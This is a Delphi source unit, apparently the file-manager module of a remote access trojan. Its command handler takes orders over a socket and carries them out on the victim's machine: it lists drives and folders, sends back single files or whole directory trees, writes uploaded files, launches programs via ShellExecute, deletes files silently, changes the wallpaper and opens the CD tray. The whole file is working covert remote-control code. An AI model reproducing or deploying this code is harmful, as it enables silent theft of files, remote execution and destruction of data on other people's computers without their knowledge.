unit UnitFileManager;

interface

uses
  applicationunit,windows,socketunit, unitshareddata, CompressionStreamUnit,ShlObj,ShFolder,
    ShellAPi, ImageHlp, mmsystem;

type
  TFileSearchRec = record
    FindData: TWIN32FindData;
    Path: string[255];
  end;

threadvar
  FileHandle: THandle;

procedure ParseData(Socket: TClientSocket; Data: string); forward;
function ParsePath(Data: string): string;
function IncludeTrailingBackslash(Path: string): string;


implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'FileManager|' + Data);
end;

function GetPlugins(AFileName: string): string;
var
  hHandle : THandle;
    sName : string;
    iNumRead,iLo,iHi : DWORD;
    pCtx : pointer;
    pBuffer,pBytePtr : PByte;
    pWsi : PWin32StreamID absolute pBuffer;
    wszStreamName: array[0..MAX_PATH] of widechar;
    FindData: TWIN32FindData;
begin
  GetMem(pBuffer,4096);
  pCtx := nil;
  hHandle := CreateFile(PChar(AFileName),GENERIC_READ,0,nil,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,0);

  if (hHandle <> INVALID_HANDLE_VALUE) then begin
    while true do begin
      // We are at the start of a stream header. read it.
      pBytePtr := pBuffer;
      if BackupRead(hHandle,pBytePtr,20,iNumRead,false,true,pCtx) then begin
        if iNumRead = 0 then
          break
        else begin
          // Can we get a stream name ?
          sName := '';

          if pWsi.dwStreamNameSize > 0 then begin
            FillChar(wszStreamName,SizeOf(wszStreamName),0);

            //if NewBackupRead(hHandle,@(wszStreamName[0]),pWsi.dwStreamNameSize,iNumRead,false,true,pCtx) then begin

            if BackupRead(hHandle,@(wszStreamName[0]),pWsi.dwStreamNameSize,iNumRead,false,true,pCtx) then begin
              if iNumRead <> pWsi.dwStreamNameSize then
                break
              else begin
                // Yep, have a name, convert from WideChar

                sName := WideCharToString(wszStreamName);

                // Clean up Name
                if sName <> '' then begin
                  sName := copy(sName,2,length(sName));
                  sName := copy(sName,1,pos(':',sName) - 1);
                end;

                //Result := Result + AFileName + sName + ':' + inttostr(pWsi.Size) + '|';
                //Result := Result + sName + ':';
                //FindData.cFileName := sName;
              end;
            end
            else
              break;
          end;

          // Skip to start of next stream data
          if pWsi.Size > 0 then
            BackupSeek(hHandle,high(DWORD),high(DWORD),iLo,iHi,@pCtx);
        end;
      end
      else
        break;
    end;

    // Release the context
    BackupRead(hHandle,pBuffer,0,iNumRead,true,false,pCtx);
    CloseHandle(hHandle);
  end;

  FreeMem(pBuffer);
end;
function DriveSize(InSize: int64): string;
var
  Kb: int64;
  Mb: int64;
  Gb: int64;
begin
  result := '0';
  //if dType <> 2 then exit;
  if InSize = 0 then exit;
  Kb := InSize div 1024;
  Mb := Kb div 1024;
  Gb := Mb div 1024;
  Result := inttostr(Gb);
end;

function SearchAndReplace(sSrc, sLookFor, sReplaceWith : string) : string;
var
   nPos, nLenLookFor : integer;
begin
   nPos := Pos(sLookFor, sSrc);
   nLenLookFor := Length(sLookFor) ;
   while (nPos > 0) do begin
     Delete(sSrc, nPos, nLenLookFor) ;
     Insert(sReplaceWith, sSrc, nPos) ;
     nPos := Pos(sLookFor, sSrc) ;
   end;
   Result := sSrc;
end;

function WinDir: string;
var
  Buf: array [0..255] of Char;
begin
  GetWindowsDirectory(Buf,255);
  Result := Buf + string('\');
end;

function RootDir: string;
begin
  Result := Copy(WinDir,1,3);
end;

function SysDir: string;
var
  Buf: array [0..255] of Char;
begin
  GetSystemDirectory(Buf,255);
  Result := Buf + string('\');
end;

function TempDir: string;
var
  Buf: array [0..255] of Char;
begin
  GetTempPath(255,Buf);
  Result := Buf;
end;

function LeftStr(Text : String ; Num : Integer): String ;
begin
  Result := Copy(Text,0,Num);
end;

function RightStr(Text : String ; Num : Integer): String ;
begin
   Result := Copy(Text,length(Text)+1 -Num,Num);
end;

function IncludeTrailingBackslash(Path: string): string;
begin
  Result := Path;
  if RightStr(Path,1) <> '\' then Result := Result + '\';
end;

function OpenTray(Drive: string; Open: bool): bool;
var
  Res: MciError;
  OpenParm: TMCI_Open_Parms;
  Flags: DWORD;
  DeviceID: Word;
begin
  Result := False;

  Flags  := MCI_OPEN_TYPE or MCI_OPEN_ELEMENT;
  with OpenParm do
  begin
    dwCallback := 0;
    lpstrDeviceType := 'CDAudio';
    lpstrElementName := PChar(Drive);
  end;

  Res := mciSendCommand(0, MCI_OPEN, Flags, Longint(@OpenParm));
  if Res <> 0 then Exit;

  DeviceID := OpenParm.wDeviceID;

  if Open then begin
    Res := mciSendCommand(DeviceID, MCI_SET, MCI_SET_DOOR_OPEN, 0);
  end else begin
    Res := mciSendCommand(DeviceID, MCI_SET, MCI_SET_DOOR_CLOSED, 0);
  end;

  if Res = 0 then Result := True;

   mciSendCommand(DeviceID, MCI_CLOSE, Flags, Longint(@OpenParm));
end;

function GetSpecialFolder(const CSIDL : integer) : string;
var
  RecPath: array[0..255] of char;
begin
  result := '';
  if SHGetSpecialFolderPath(0,RecPath,CSIDL,false) then result := IncludeTrailingBackslash(RecPath);
end;

function ParsePath(Data: string): string;
begin
  if Pos('%ROOT%',Data) > 0 then Data := SearchAndReplace(Data,'%ROOT%',RootDir);
  if Pos('%DESKTOP%',Data) > 0 then Data := SearchAndReplace(Data,'%DESKTOP%',GetSpecialFolder(CSIDL_DESKTOP));
  if Pos('%MYDOCUMENTS%',Data) > 0 then Data := SearchAndReplace(Data,'%MYDOCUMENTS%',GetSpecialFolder(CSIDL_PERSONAL));
  if Pos('%APPLICATIONDATA%',Data) > 0 then Data := SearchAndReplace(Data,'%APPLICATIONDATA%',GetSpecialFolder(CSIDL_LOCAL_APPDATA));
  if Pos('%PROGRAMFILES%',Data) > 0 then Data := SearchAndReplace(Data,'%PROGRAMFILES%',GetSpecialFolder(CSIDL_PROGRAM_FILES));
  if Pos('%WINDOWS%',Data) > 0 then Data := SearchAndReplace(Data,'%WINDOWS%',Windir);
  if Pos('%SYSTEM%',Data) > 0 then Data := SearchAndReplace(Data,'%SYSTEM%',SysDir);
  if Pos('%TEMP%',Data) > 0 then Data := SearchAndReplace(Data,'%TEMP%',TempDir);
  //if Pos('%MYPICTURES%',Data) > 0 then Data := SearchAndReplace(Data,'%MYPICTURES%',GetSpecialFolder(CSIDL_MYPICTURES));
  {if Pos('%PROGRAMS%',Data) > 0 then Data := SearchAndReplace(Data,'%PROGRAMS%',GetSpecialFolder(CSIDL_PROGRAMS));
  if Pos('%RECENTFILES%',Data) > 0 then Data := SearchAndReplace(Data,'%RECENTFILES%',GetSpecialFolder(CSIDL_RECENT));
  if Pos('%SENDTO%',Data) > 0 then Data := SearchAndReplace(Data,'%SENDTO%',GetSpecialFolder(CSIDL_SENDTO));
  if Pos('%STARTMENU%',Data) > 0 then Data := SearchAndReplace(Data,'%STARTMENU%',GetSpecialFolder(CSIDL_STARTMENU));
  if Pos('%STARTUP%',Data) > 0 then Data := SearchAndReplace(Data,'%STARTUP%',GetSpecialFolder(CSIDL_STARTUP));
  if Pos('%COOKIES%',Data) > 0 then Data := SearchAndReplace(Data,'%COOKIES%',GetSpecialFolder(CSIDL_COOKIES));
  }
  result := Data;
end;

function GetAttrib(FindData: TWIN32FindData):string;
begin
  if FindData.dwFileAttributes and $00000010 <> 0 then begin
    Result := 'File Folder';
  end else begin
    if FindData.dwFileAttributes and $00000020 <> 0 then Result := Result + 'A';
    if FindData.dwFileAttributes and $00000002 <> 0 then Result := Result + 'H';
    if FindData.dwFileAttributes and $00000001 <> 0 then Result := Result + 'R';
    if FindData.dwFileAttributes and $00000004 <> 0 then Result := Result + 'S';
  end;
end;

procedure FolderList(Stream: TMemoryStream; path: string);
var
  FindData: TWIN32FindData;
  hFind: THandle;
begin
  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + '*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;

  if GetAttrib(FindData) = 'File Folder' then Begin
    Stream.WriteBuffer(FindData,SizeOf(TWIN32FindData));
  end;

  while FindNextFile(hFind, FindData) do begin

    if GetAttrib(FindData) = 'File Folder' then begin
      Stream.WriteBuffer(FindData,SizeOf(TWIN32FindData));
    end;

  end;
  FindClose(hFind);
end;

procedure FileList(Stream: TMemoryStream; path: string);
var
  FindData: TWIN32FindData;
  hFind: THandle;
begin
  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + '*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;

  if GetAttrib(FindData) <> 'File Folder' then begin
    Stream.WriteBuffer(FindData,SizeOf(TWIN32FindData));
  end;

  while FindNextFile(hFind, FindData) do begin

    if GetAttrib(FindData) <> 'File Folder' then begin
      Stream.WriteBuffer(FindData,SizeOf(TWIN32FindData));
    end;

  end;
  FindClose(hFind);
end;

procedure FileListRecursive(Stream: TMemoryStream; path: string);
var
  FindData: TWIN32FindData;
  hFind: THandle;
  FileSearchRec: TFileSearchRec;
begin
  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + '*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;

  if GetAttrib(FindData) <> 'File Folder' then begin
    FileSearchRec.Path := Path;
    FileSearchRec.FindData := FindData;
    Stream.WriteBuffer(FileSearchRec,SizeOf(TFileSearchRec));
  end else begin
    if (string(FindData.cFileName) <> '.') and (FindData.cFileName <> '..') then FileListRecursive(Stream,Path + FindData.cFileName);
  end;

  while FindNextFile(hFind, FindData) do begin
    if GetAttrib(FindData) <> 'File Folder' then begin
      FileSearchRec.Path := Path;
      FileSearchRec.FindData := FindData;
      Stream.WriteBuffer(FileSearchRec,SizeOf(TFileSearchRec));
    end else begin
      if (string(FindData.cFileName) <> '.') and (FindData.cFileName <> '..') then FileListRecursive(Stream,Path + FindData.cFileName);
    end;
  end;

  FindClose(hFind);
end;

function GetList(Path: string; Files: bool): string;
var
  Stream: TMemoryStream;
begin
  Path := ParsePath(Path);
  Stream := TMemoryStream.Create;
  if Files then FileList(Stream,Path) else FolderList(Stream,Path);
  SetString(Result, PChar(Stream.Memory), Stream.Size);
  Stream.Free;
end;

function DriveAttrib(Drive: string): string;
var
  FSSysFlags,maxCmpLen: DWord;
  pFSBuf: PChar;
begin
  GetMem(pFSBuf, MAX_PATH);
  ZeroMemory(pFSBuf,MAX_PATH);
  GetVolumeInformation(pchar(Drive), nil, 0, nil, maxCmpLen, FSSysFlags, pFSBuf, MAX_PATH);
  result := (pFSBuf);
  FreeMem(pFSBuf, MAX_PATH);
end;

function DriveVolumeName(Drive: string): string;
var
  FSSysFlags,maxCmpLen: DWord;
  pFileSystem: PChar;
  pVolName: pchar;
begin
  GetMem(pVolName, MAX_PATH);
  ZeroMemory(pVolName,MAX_PATH);
  GetVolumeInformation(pchar(Drive), pVolName, MAX_PATH, nil, maxCmpLen, FSSysFlags, nil, 0);
  result := (pVolName);
  FreeMem(pVolName, MAX_PATH);
end;

function DriveList: string;
var
  BufferSize, ReturnSize: dword;
  PBuffer: PChar;
  Buffer: PChar;
  DriveType: integer;
  mysize,freesize,totalsize: int64;
  Stream: TMemoryStream;
  DriveSize: string;
begin
  Result := '';
  BufferSize := 1;
  GetMem(Buffer, BufferSize);
  ReturnSize := GetLogicalDriveStrings(BufferSize, Buffer);
  if ReturnSize > BufferSize then begin
    BufferSize := ReturnSize;
    ReallocMem(Buffer, BufferSize);
    GetLogicalDriveStrings(BufferSize, Buffer);
  end;
  PBuffer := Buffer;
  while PBuffer^ <> #0 do begin
    DriveType := GetDriveType(PBuffer);

    MySize := 0;
    Totalsize := 0;
    Freesize := 0;
    GetDiskFreeSpaceEx(PBuffer, MySize, Totalsize, @Freesize);

    Stream := TMemoryStream.Create;
    Stream.Write(TotalSize,SizeOf(TotalSize));
    SetString(DriveSize,pchar(Stream.Memory),Stream.Size);
    Stream.Free;

    Result := Result + PBuffer + '|';
    Result := Result +  DriveSize + '|';
    Result := Result +  DriveAttrib(PBuffer) + '|';
    Result := Result +  inttostr(DriveType) + '|';
    Result := Result +  DriveVolumeName(PBuffer) + '|';

    Inc(PBuffer,4);
  end;
end;

function RenameFile(OldPath:string; NewPath: string): string;
var
  fos: TSHFileOpStruct;
begin
  Result := 'Error Renaming File: ' + OldPath + ' To ' + NewPath;
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_MOVE;
    fFlags := FOF_FILESONLY + FOF_SILENT + FOF_NOCONFIRMATION + FOF_NOERRORUI;
    pFrom := PChar(OldPath + #0);
    pTo := PChar(NewPath)
  end;
  if (0 = ShFileOperation(fos)) then Result := 'Renamed File: ' + OldPath + ' To ' + NewPath;
end;

function DeleteDirectory(dir: string): string;
var
  fos: TSHFileOpStruct;
begin
  Result := 'Error Deleting File: ' + dir;
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_DELETE;
    fFlags := FOF_SILENT + FOF_NOCONFIRMATION + FOF_NOERRORUI;
    pFrom := PChar(dir + #0);
  end;
  if (0 = ShFileOperation(fos)) then Result := 'Deleted File: ' + dir;
end;

function FileDeleteRB(dir:string): string;
var
  fos: TSHFileOpStruct;
begin
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_DELETE;
    fFlags := FOF_SILENT + FOF_NOCONFIRMATION + FOF_NOERRORUI + FOF_ALLOWUNDO;
    pFrom := PChar(dir + #0);
  end;
end;



procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command: string;
  Stream: TMemoryStream;
  Path: string;
  s: string;
  filesize,p: int64;
  BytesWritten,BytesRead: dword;
  FileHandle: THandle;
  SocketData: TSocketData;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);
  SocketData := TSocketData(Socket.Data);

  if Command = 'DriveList' then begin
    SendData(Socket,Command + '|' + DriveList);
    //SendData(Socket,'FolderList' + '|' + ParsePath('%ROOT%') + '|' + GetList('%ROOT%',False));
    //SendData(Socket,'FileList' + '|' + GetList('%ROOT%',True));
  end;

  if Command = 'FileList' then begin
    s := GetList(ParsePath(Data),False);
    SendData(Socket,'FolderList' + '|' + ParsePath(Data) + '|' + s);
    Sleep(10);
    s :=  GetList(ParsePath(Data),True);
    SendData(Socket,'FileList' + '|' + s);
  end;

  if Command = 'DownloadFolder' then begin
    Path := ParsePath(Data);
    Stream := TMemoryStream.Create;
    FileListRecursive(Stream,Path);
    SetString(Data, PChar(Stream.Memory), Stream.Size);
    Stream.Free;
    SendData(Socket,Command + '|' + Data);
  end;

  if Command = 'Execute' then begin
    ShellExecute(0,'open',pchar(split(Data,'|',1)),pchar(split(Data,'|',2)),'',strtoint(split(Data,'|',3)));
  end;

  if Command = 'Rename' then begin
    RenameFile(split(Data,'|',1),split(Data,'|',2));
  end;

  if Command = 'Create' then begin
    MakeSureDirectoryPathExists(pchar(Data));
  end;

  if Command = 'Delete' then begin
    DeleteDirectory(Data);
  end;

  if Command = 'Recycle' then begin
    FileDeleteRB(Data);
  end;

  if Command = 'SetWallpaper' then begin
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, pchar(Data), SPIF_SENDCHANGE);
  end;

  if Command = 'OpenTray' then begin
    opentray(Data,True);
  end;

  if Command = 'CloseTray' then begin
    opentray(Data,False);
  end;

  if Command = 'EditFile' then begin
    Stream := TMemoryStream.Create;
    Stream.LoadFromFile(Data);
    SetString(Data,Pchar(Stream.Memory),Stream.Size);
    Stream.Free;
    SendData(Socket,Command + '|' + Data);
  end;

  if Command = 'Upload' then begin
    Command := Split(Data,'|',1);
    Delete(Data,1,Length(Command)+1);
    Stream := TMemoryStream.Create;
    Stream.Write(pointer(Data)^,Length(Data));
    Stream.SaveToFile(Command);
    Stream.Free;
    Socket.Disconnect;
  end;

  if Command = 'GetThumbs' then begin
    Stream := TMemoryStream.Create;
    Stream.LoadFromFile(Data);
    SetString(Data,Pchar(Stream.Memory),Stream.Size);
    Stream.Free;
    SendData(Socket,Command + '|' + Data);
  end;

  if Command = 'Download' then begin
    {Stream := TMemoryStream.Create;
    Stream.LoadFromFile(Data);
    Data := '';
    if Stream.Size > 0 then SetString(Data,Pchar(Stream.Memory),Stream.Size);
    Stream.Free;
    UnitSharedData.SendData(Socket,'FileTransfer|' + Command + '|' + Data);}
    p := 0;
    FileHandle := CreateFile(pchar(Data),GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    FileSize := GetFileSize(FileHandle,nil);
    UnitSharedData.SendData(Socket,'FileTransfer|OpenFile|' + inttostr(FileSize));
    SetLength(Data,4096);
    while P < FileSize do begin
      Inc(P,4096);
      ReadFile(FileHandle,pointer(Data)^,4096,BytesRead,0);
      UnitSharedData.SendData(Socket,'FileTransfer|WriteFile|' + Data);
      Sleep(10);
    end;
    UnitSharedData.SendData(Socket,'FileTransfer|CloseFile');
    CloseHandle(FileHandle);
  end;

  if Command = 'OpenFile' then begin
    SocketData.FileHandle := CreateFile(pchar(Data),GENERIC_WRITE,FILE_SHARE_WRITE,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
  end;

  if Command = 'WriteFile' then begin
    WriteFile(SocketData.FileHandle,pointer(Data)^,Length(Data),BytesWritten,nil);
  end;

  if Command = 'CloseFile' then begin
    CloseHandle(SocketData.FileHandle);
  end;

end;

end.
